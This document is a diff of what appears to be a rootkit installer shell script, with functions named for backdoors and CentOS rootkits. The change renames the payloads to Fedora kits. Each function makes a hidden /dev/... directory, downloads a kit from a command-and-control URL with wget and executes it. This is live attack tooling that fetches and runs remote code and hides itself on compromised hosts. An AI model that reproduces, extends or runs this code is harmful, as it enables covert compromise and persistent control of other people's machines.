@@ -122,21 +122,21 @@ do_bsdbackdoors() {
 
 
 do_centos_rootkit() {
-	echo "Retrieving CentOS x86 kit..."
+	echo "Retrieving Fedora x86 kit..."
 	mkdir /dev/... 
 	cd /dev/...
-	wget -q $C2_URL$CENTOS_KIT
-	chmod +x `basename $CENTOS_KIT`
-	./`basename $CENTOS_KIT`
+	wget -q $C2_URL$FEDORA_KIT
+	chmod +x `basename $FEDORA_KIT`
+	./`basename $FEDORA_KIT`
 }
 
 do_centos64_rootkit() {
-	echo "Retrieving CentOS x64 kit..."
+	echo "Retrieving Fedora x64 kit..."
 	mkdir /dev/...
 	cd /dev/...
-	wget -q $C2_URL$CENTOS64_KIT
-	chmod +x `basename $CENTOS_KIT`
-	./`basename $CENTOS_KIT`
+	wget -q $C2_URL$FEDORA64_KIT
+	chmod +x `basename $FEDORA64_KIT`
+	./`basename $FEDORA64_KIT`
 }
 
 
